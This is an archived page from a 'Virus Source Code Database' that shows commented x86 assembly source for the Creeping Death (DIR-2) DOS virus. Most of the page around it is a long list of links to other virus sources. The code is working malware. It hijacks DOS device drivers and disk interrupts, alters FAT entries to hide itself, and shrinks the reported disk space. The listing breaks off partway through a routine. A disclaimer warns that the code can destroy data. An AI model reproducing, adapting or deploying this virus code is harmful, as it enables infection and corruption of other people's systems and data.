<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: death_asm</title>
<meta name="KEYWORDS" content="death.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for death.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="da_1800_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da_1800_asm.php">da_1800_asm</a><br>
<a href="da_2000d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da_2000d_asm.php">da_2000d_asm</a><br>
<a href="da_2100_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da_2100_asm.php">da_2100_asm</a><br>
<a href="da'boys__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da'boys__asm.php">da'boys__asm</a><br>
<a href="da'boys_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da'boys_asm.php">da'boys_asm</a><br>
<a href="daddy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/daddy_asm.php">daddy_asm</a><br>
<a href="daemaen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/daemaen_asm.php">daemaen_asm</a><br>
<a href="dame_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dame_asm.php">dame_asm</a><br>
<a href="dan_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dan_asm.php">dan_asm</a><br>
<a href="danger_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/danger_asm.php">danger_asm</a><br>
<a href="da_olivr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da_olivr_asm.php">da_olivr_asm</a><br>
<a href="dapm2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dapm2_asm.php">dapm2_asm</a><br>
<a href="dark2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dark2_asm.php">dark2_asm</a><br>
<a href="dark3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dark3_asm.php">dark3_asm</a><br>
<a href="darkapoc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darkapoc_asm.php">darkapoc_asm</a><br>
<a href="dark__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dark__asm.php">dark__asm</a><br>
<a href="dark_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dark_asm.php">dark_asm</a><br>
<a href="darkaven_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darkaven_asm.php">darkaven_asm</a><br>
<a href="darkstar_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darkstar_asm.php">darkstar_asm</a><br>
<a href="darlene_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darlene_asm.php">darlene_asm</a><br>
<a href="darth1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth1_asm.php">darth1_asm</a><br>
<a href="darth2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth2_asm.php">darth2_asm</a><br>
<a href="darth3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth3_asm.php">darth3_asm</a><br>
<a href="darth4___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth4___asm.php">darth4___asm</a><br>
<a href="darth4__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth4__asm.php">darth4__asm</a><br>
<a href="darth4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth4_asm.php">darth4_asm</a><br>
<a href="darth_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth_asm.php">darth_asm</a><br>
<a href="das_boot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/das_boot_asm.php">das_boot_asm</a><br>
<a href="datacrim_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/datacrim_asm.php">datacrim_asm</a><br>
<a href="datalock_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/datalock_asm.php">datalock_asm</a><br>
<a href="datarape_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/datarape_asm.php">datarape_asm</a><br>
<a href="datarp23_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/datarp23_asm.php">datarp23_asm</a><br>
<a href="dav1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dav1_asm.php">dav1_asm</a><br>
<a href="dav_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dav_b_asm.php">dav_b_asm</a><br>
<a href="dbase_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dbase_asm.php">dbase_asm</a><br>
<a href="dc-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dc-b_asm.php">dc-b_asm</a><br>
<a href="dcii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dcii_asm.php">dcii_asm</a><br>
<a href="death_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/death_asm.php">death_asm</a><br>
<a href="de'buger_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/de'buger_asm.php">de'buger_asm</a><br>
<a href="decode__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/decode__asm.php">decode__asm</a><br>
<a href="decode_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/decode_asm.php">decode_asm</a><br>
<a href="decom_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/decom_asm.php">decom_asm</a><br>
<a href="define___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/define___asm.php">define___asm</a><br>
<a href="define__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/define__asm.php">define__asm</a><br>
<a href="define_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/define_asm.php">define_asm</a><br>
<a href="defs_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/defs_asm.php">defs_asm</a><br>
<a href="dei_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dei_asm.php">dei_asm</a><br>
<a href="deicide__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/deicide__asm.php">deicide__asm</a><br>
<a href="deicide_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/deicide_asm.php">deicide_asm</a><br>
<a href="deldir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/deldir_asm.php">deldir_asm</a><br>
<a href="demo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demo_asm.php">demo_asm</a><br>
<a href="demoexe_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demoexe_asm.php">demoexe_asm</a><br>
<a href="demon__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demon__asm.php">demon__asm</a><br>
<a href="demon_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demon_asm.php">demon_asm</a><br>
<a href="demov1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov1_asm.php">demov1_asm</a><br>
<a href="demov2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov2_asm.php">demov2_asm</a><br>
<a href="demov3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov3_asm.php">demov3_asm</a><br>
<a href="demov4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov4_asm.php">demov4_asm</a><br>
<a href="demov5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov5_asm.php">demov5_asm</a><br>
<a href="demovir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demovir_asm.php">demovir_asm</a><br>
<a href="destruct_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/destruct_asm.php">destruct_asm</a><br>
<a href="detect_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/detect_asm.php">detect_asm</a><br>
<a href="devdance_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/devdance_asm.php">devdance_asm</a><br>
<a href="dhog_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dhog_asm.php">dhog_asm</a><br>
<a href="diamond__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diamond__asm.php">diamond__asm</a><br>
<a href="diamond_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diamond_asm.php">diamond_asm</a><br>
<a href="diarrhe4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diarrhe4_asm.php">diarrhe4_asm</a><br>
<a href="diarrhe6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diarrhe6_asm.php">diarrhe6_asm</a><br>
<a href="dieloser_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dieloser_pas.php">dieloser_pas</a><br>
<a href="digdeath_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/digdeath_asm.php">digdeath_asm</a><br>
<a href="digipol_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/digipol_asm.php">digipol_asm</a><br>
<a href="dikotomy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dikotomy_asm.php">dikotomy_asm</a><br>
<a href="diogenes_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diogenes_asm.php">diogenes_asm</a><br>
<a href="dir-2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir-2_asm.php">dir-2_asm</a><br>
<a href="dir2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir2_asm.php">dir2_asm</a><br>
<a href="dir_2d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir_2d_asm.php">dir_2d_asm</a><br>
<a href="dir_ii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir_ii_asm.php">dir_ii_asm</a><br>
<a href="dir-ii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir-ii_asm.php">dir-ii_asm</a><br>
<a href="dirii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dirii_asm.php">dirii_asm</a><br>
<a href="dir_iii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir_iii_asm.php">dir_iii_asm</a><br>
<a href="dir-vir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir-vir_asm.php">dir-vir_asm</a><br>
<a href="diskkill_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diskkill_asm.php">diskkill_asm</a><br>
<a href="dissolve_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dissolve_asm.php">dissolve_asm</a><br>
<a href="dj_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dj_asm.php">dj_asm</a><br>
<a href="dkennedy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dkennedy_asm.php">dkennedy_asm</a><br>
<a href="donothin_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/donothin_asm.php">donothin_asm</a><br>
<a href="dontell__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dontell__asm.php">dontell__asm</a><br>
<a href="dontello_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dontello_asm.php">dontello_asm</a><br>
<a href="doodle_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/doodle_asm.php">doodle_asm</a><br>
<a href="doom_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/doom_asm.php">doom_asm</a><br>
<a href="doomsday_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/doomsday_asm.php">doomsday_asm</a><br>
<a href="dos_1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dos_1_asm.php">dos_1_asm</a><br>
<a href="dos-1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dos-1_asm.php">dos-1_asm</a><br>
<a href="dos1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dos1_asm.php">dos1_asm</a><br>
<a href="doteater_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/doteater_asm.php">doteater_asm</a><br>
<a href="dotkill_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dotkill_asm.php">dotkill_asm</a><br>
<a href="dr20-inf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dr20-inf_asm.php">dr20-inf_asm</a><br>
<a href="dreamer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dreamer_asm.php">dreamer_asm</a><br>
<a href="dreamwrl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dreamwrl_asm.php">dreamwrl_asm</a><br>
<a href="droper_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/droper_asm.php">droper_asm</a><br>
<a href="drop_rep_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/drop_rep_asm.php">drop_rep_asm</a><br>
<a href="dropsy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dropsy_asm.php">dropsy_asm</a><br>
<a href="drq-1028_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/drq-1028_asm.php">drq-1028_asm</a><br>
<a href="drq_1161_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/drq_1161_asm.php">drq_1161_asm</a><br>
<a href="drq-1161_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/drq-1161_asm.php">drq-1161_asm</a><br>
<a href="druid_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/druid_asm.php">druid_asm</a><br>
<a href="dsce-gen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dsce-gen_asm.php">dsce-gen_asm</a><br>
<a href="dsmedemo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dsmedemo_asm.php">dsmedemo_asm</a><br>
<a href="dsme-gen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dsme-gen_asm.php">dsme-gen_asm</a><br>
<a href="dt_251_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt_251_asm.php">dt_251_asm</a><br>
<a href="dt-251_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt-251_asm.php">dt-251_asm</a><br>
<a href="dt_310_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt_310_asm.php">dt_310_asm</a><br>
<a href="dt-310_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt-310_asm.php">dt-310_asm</a><br>
<a href="dtiny_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dtiny_asm.php">dtiny_asm</a><br>
<a href="dt_kendy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt_kendy_asm.php">dt_kendy_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

; Dark Angel's comments: I spent my entire waking hours looking at this virus.
;                        I love it.  It is my life.  I worship the drive it
;                        infects.  Take a look at it.  Let not my troubles be
;                        in vain.  Why did I do this?  I sacrifice my life for
;                        the benefit of 40Hex.  If you don't read this, I'm
;                        gonna go join [NuKE].

;        Creeping Death  V 1.0
;
;        (C) Copyright 1991 by VirusSoft Corp.

i13org    =    5f8h
i21org    =    5fch

dir_2   segment byte public
        assume  cs:dir_2, ds:dir_2

        org   100h

start:
         mov   sp,600h                          ; Set up the stack pointer
         inc   word ptr counter                 ; Generation counter
         xor   cx,cx
         mov   ds,cx                            ; DS points to interrupt table
         lds   ax, ds:[0c1h]                    ; Find interrupt 30h
         add   ax,21h                           ; Change it to Int 21h
         push  ds                               ; Save it on stack for use by
         push  ax                               ; subroutine "jump"
         mov   ah,30h                           ; Get DOS version
         call  jump
         cmp   al,4                             ; DOS 4.X+ : SI = 0
         sbb   si,si                            ; DOS 2/3  : SI = -1
         mov   byte ptr [drive+2],byte ptr -1   ; Initialise last drive to
                                                ; "never accessed"
         mov   bx,60h                           ; Adjust memory in ES to
         mov   ah,4ah                           ; BX paragraphs.
         call  jump

         mov   ah,52h                           ; Get DOS List of Lists
         call  jump                             ; to ES:BX
         push  es:[bx-2]                        ; Save Segment of first MCB
         lds   bx,es:[bx]                       ; DS:BX -> 1st DPB
                                                ;  (Drive parameter block)
search:  mov   ax,[bx+si+15h]                   ; Get segment of device driver
         cmp   ax,70h                           ; Is it CONFIG? (I think)
         jne   next                             ; If not, try again
         xchg  ax,cx                            ; Move driver segment to CX
         mov   [bx+si+18h],byte ptr -1          ; Flag block must be rebuilt
         mov   di,[bx+si+13h]                   ; Save offset of device driver
                                                ; Original device driver
                                                ; address in CX:DI
         mov   [bx+si+13h],offset header        ; Replace with our own
         mov   [bx+si+15h],cs                   ;  (header)
next:    lds   bx,[bx+si+19h]                   ; Get next device block
         cmp   bx,-1                            ; Is it the last one?
         jne   search                           ; If not, search it
         jcxz  install

         pop   ds                               ; Restore segment of first
         mov   ax,ds                            ; MCB
         add   ax,ds:[3]                        ; Go to next MCB
         inc   ax                               ; AX = segment next MCB
         mov   dx,cs                            ; DX = MCB owning current
         dec   dx                               ;      program
         cmp   ax,dx                            ; Are these the same?
         jne   no_boot                          ; If not, we are not currently
                                                ; in the middle of a reboot
         add   word ptr ds:[3],61h              ; Increase length owned by
                                                ; MCB by 1552 bytes
no_boot: mov   ds,dx                            ; DS = MCB owning current
                                                ; program
         mov   word ptr ds:[1],8                ; Set owner = DOS

         mov   ds,cx                            ; DS = segment of original
                                                ;      device driver
         les   ax,[di+6]                        ; ES = offset int handler
                                                ; AX = offset strategy entry
         mov   word ptr cs:str_block,ax         ; Save entry point
         mov   word ptr cs:int_block,es         ; And int block for use in
                                                ; function _in
         cld                                    ; Scan for the write
         mov   si,1                             ; function in the
scan:    dec   si                               ; original device driver
         lodsw
         cmp   ax,1effh
         jne   scan
         mov   ax,2cah                          ; Wicked un-yar place o'
         cmp   [si+4],ax                        ; doom.
         je    right
         cmp   [si+5],ax
         jne   scan
right:   lodsw
         push  cs
         pop   es
         mov   di,offset modify+1               ; Save address of patch
         stosw                                  ; area so it can be changed
         xchg  ax,si                            ; later.
         mov   di,offset i13org                 ; This is in the stack, but
         cli                                    ; it is used by "i13pr"
         movsw
         movsw

         mov   dx,0c000h                        ; Scan for hard disk ROM
                                                ; Start search @ segment C000h
fdsk1:   mov   ds,dx                            ; Load up the segment
         xor   si,si                            ; atart at offset 0000h
         lodsw                                  ; Scan for the signature
         cmp   ax,0aa55h                        ; Is it the signature?
         jne   fdsk4                            ; If not, change segment
         cbw                                    ; clear AH
         lodsb                                  ; load a byte to AL
         mov   cl,9
         sal   ax,cl                            ; Shift left, 0 filled
fdsk2:   cmp   [si],6c7h
         jne   fdsk3
         cmp   word ptr [si+2],4ch
         jne   fdsk3
         push  dx                               ; Save the segment
         push  [si+4]                           ; and offset on stack
         jmp   short death                      ; for use by i13pr

install: int   20h
file:    db    "c:",255,0
fdsk3:   inc   si                               ; Increment search offset
         cmp   si,ax                            ; If we are not too high,
         jb    fdsk2                            ; try again
fdsk4:   inc   dx                               ; Increment search segment
         cmp   dh,0f0h                          ; If we are not in high
         jb    fdsk1                            ; memory, try again

         sub   sp,4                             ; effectively push dummy vars.
death:   push  cs                               ; on stack for use by i13pr
         pop   ds
         mov   bx,ds:[2ch]                      ; Get environment from PSP
         mov   es,bx
         mov   ah,49h                           ; Release it (to save memory)
         call  jump
         xor   ax,ax
         test  bx,bx                            ; Is BX = 0?
         jz    boot                             ; If so, we are booting now
         mov   di,1                             ; and not running a file
seek:    dec   di                               ; Search for end of
         scasw                                  ; the environment block
         jne   seek
         lea   si,[di+2]                        ; SI points to filename
         jmp   short exec                       ; (in DOS 3.X+)
                                                ; Execute that file
boot:    mov   es,ds:[16h]                      ; get PSP of parent
         mov   bx,es:[16h]                      ; get PSP of parent
         dec   bx                               ; go to its MCB
         xor   si,si
exec:    push  bx
         mov   bx,offset param                  ; Set up parameter block
                                                ; for EXEC function
         mov   [bx+4],cs                        ; segment to command line
         mov   [bx+8],cs                        ; segment to 1st FCB
         mov   [bx+12],cs                       ; segment to 2nd FCB
         pop   ds
         push  cs
         pop   es

         mov   di,offset f_name
         push  di                               ; Save filename offset
         mov   cx,40                            ; Copy the filename to
         rep   movsw                            ; the buffer
         push  cs
         pop   ds

         mov   ah,3dh                           ; Handle open file
         mov   dx,offset file                   ; "c:ÿ",0
         call  jump
         pop   dx                               ; DS:DX -> filename

         mov   ax,4b00h                         ; Load and Execute
         call  jump                             ; ES:BX = param block
         mov   ah,4dh                           ; Get errorlevel
         call  jump
         mov   ah,4ch                           ; Terminate

jump:    pushf                                  ; Simulate an interrupt 21h
         call  dword ptr cs:[i21org]
         ret


;--------Installation complete

i13pr:   mov   ah,3                             ; Write AL sectors from ES:BX
         jmp   dword ptr cs:[i13org]            ; to track CH, sector CL,
                                                ; head DH, drive DL


main:    push  ax            ; driver
         push  cx            ; strategy block
         push  dx
         push  ds
         push  si
         push  di

         push  es                               ; Move segment of parameter
         pop   ds                               ; block to DS
         mov   al,[bx+2]                        ; [bx+2] holds command code

         cmp   al,4                             ; Input (read)
         je    input
         cmp   al,8                             ; Output (write)
         je    output
         cmp   al,9                             ; Output (write) with verify
         je    output

         call  in_                              ; Call original device
         cmp   al,2                             ; Request build BPB
         jne   ppp                              ; If none of the above, exit
         lds   si,[bx+12h]                      ; DS:SI point to BPB table
         mov   di,offset bpb_buf                ; Replace old pointer with
         mov   es:[bx+12h],di                   ; a pointer to our own
         mov   es:[bx+14h],cs                   ; BPB table
         push  es                               ; Save segment of parameters
         push  cs
         pop   es
         mov   cx,16                            ; Copy the old BPB table to
         rep   movsw                            ; our own
         pop   es                               ; Restore parameter segment
         push  cs
         pop   ds
         mov   al,[di+2-32]                     ; AL = sectors per allocation
         cmp   al,2                             ;      unit.  If less than
         adc   al,0                             ;      2, increment
         cbw                                    ; Extend sign to AH (clear AH)
         cmp   word ptr [di+8-32],0             ; Is total number sectors = 0?
         je    m32                              ; If so, big partition (>32MB)
         sub   [di+8-32],ax                     ; Decrease space of disk by
                                                ; one allocation unit(cluster)
         jmp   short ppp                        ; Exit
m32:     sub   [di+15h-32],ax                   ; Handle large partitions
         sbb   word ptr [di+17h-32],0

ppp:     pop   di
         pop   si
         pop   ds
         pop   dx
         pop   cx
         pop   ax
rts:     retf                                   ; We are outta here!

output:  mov   cx,0ff09h
         call  check                            ; is it a new disk?
         jz    inf_sec                          ; If not, go away
         call  in_                              ; Call original device handler
         jmp   short inf_dsk

inf_sec: jmp   _inf_sec
read:    jmp   _read
read_:   add   sp,16                            ; Restore the stack
         jmp   short ppp                        ; Leave device driver

input:   call  check                            ; Is it a new disk?
         jz    read                             ; If not, leave
inf_dsk: mov   byte ptr [bx+2],4                ; Set command code to READ
         cld
         lea   si,[bx+0eh]                      ; Load from buffer address
         mov   cx,8                             ; Save device driver request
save:    lodsw                                  ; on the stack
         push  ax
         loop  save
         mov   word ptr [bx+14h],1              ; Starting sector number = 1
                                                ; (Read 1st FAT)
         call  driver                           ; Read one sector
         jnz   read_                            ; If error, exit
         mov   byte ptr [bx+2],2                ; Otherwise build BPB
         call  in_                              ; Have original driver do the
                                                ; work
         lds   si,[bx+12h]                      ; DS:SI points to BPB table
         mov   ax,[si+6]                        ; Number root directory entries
         add   ax,15                            ; Round up
         mov   cl,4
         shr   ax,cl                            ; Divide by 16 to find sectors
                                                ; of root directory
         mov   di,[si+0bh]                      ; DI = sectors/FAT
         add   di,di                            ; Double for 2 FATs
         stc                                    ; Add one for boot record
         adc   di,ax                            ; Add sector size of root dir
         push  di                               ; to find starting sector of
                                                ; data (and read)
         cwd                                    ; Clear DX
         mov   ax,[si+8]                        ; AX = total sectors
         test  ax,ax                            ; If it is zero, then we have
         jnz   more                             ; an extended partition(>32MB)
         mov   ax,[si+15h]                      ; Load DX:AX with total number
         mov   dx,[si+17h]                      ; of sectors
more:    xor   cx,cx
         sub   ax,di                            ; Calculate FAT entry for last
                                                ; sector of disk
         sbb   dx,cx
         mov   cl,[si+2]                        ; CL = sectors/cluster
         div   cx                               ; AX = cluster #
         cmp   cl,2                             ; If there is more than 1
         sbb   ax,-1                            ; cluster/sector, add one
         push  ax                               ; Save cluster number
         call  convert                          ; AX = sector number to read
                                                ; DX = offset in sector AX
                                                ;      of FAT entry
                                                ; DI = mask for EOF marker
         mov   byte ptr es:[bx+2],4             ; INPUT (read)
         mov   es:[bx+14h],ax                   ; Starting sector = AX
         call  driver                           ; One sector only
again:   lds   si,es:[bx+0eh]                   ; DS:SI = buffer address
         add   si,dx                            ; Go to FAT entry
         sub   dh,cl                            ; Calculate a new encryption
         adc   dx,ax                            ; value
         mov   word ptr cs:gad+1,dx             ; Change the encryption value
         cmp   cl,1                             ; If there is 0 cluster/sector
         je    small_                           ; then jump to "small_"
         mov   ax,[si]                          ; Load AX with offset of FAT
                                                ; entry
         and   ax,di                            ; Mask it with value from
                                                ; "convert" then test to see
                                                ; if the sector is fine
         cmp   ax,0fff7h                        ; 16 bit reserved/bad
         je    bad
         cmp   ax,0ff7h                         ; 12 bit reserved/bad
         je    bad
         cmp   ax,0ff70h                        ; 12 bit reserved/bad
         jne   ok
bad:     pop   ax                               ; Tried to replicate on a bad
         dec   ax                               ; cluster.  Try again on a
         push  ax                               ; lower one.
         call  convert                          ; Find where it is in the FAT
         jmp   short again                      ; and try once more
small_:  not   di                               ; Reverse mask bits
         and   [si],di                          ; Clear other bits
         pop   ax                               ; AX = cluster number
         push  ax
         inc   ax                               ; Need to do 2 consecutive
         push  ax                               ; bytes
         mov   dx,0fh
         test  di,dx
         jz    here
         inc   dx                               ; Multiply by 16
         mul   dx
here:    or    [si],ax                          ; Set cluster to next
         pop   ax                               ; Restore cluster of write
         call  convert                          ; Calculate buffer offset
         mov   si,es:[bx+0eh]                   ; Go to FAT entry (in buffer)
         add   si,dx
         mov   ax,[si]
         and   ax,di
ok:      mov   dx,di                            ; DI = mask from "convert"
         dec   dx
         and   dx,di                            ; Yerg!
         not   di
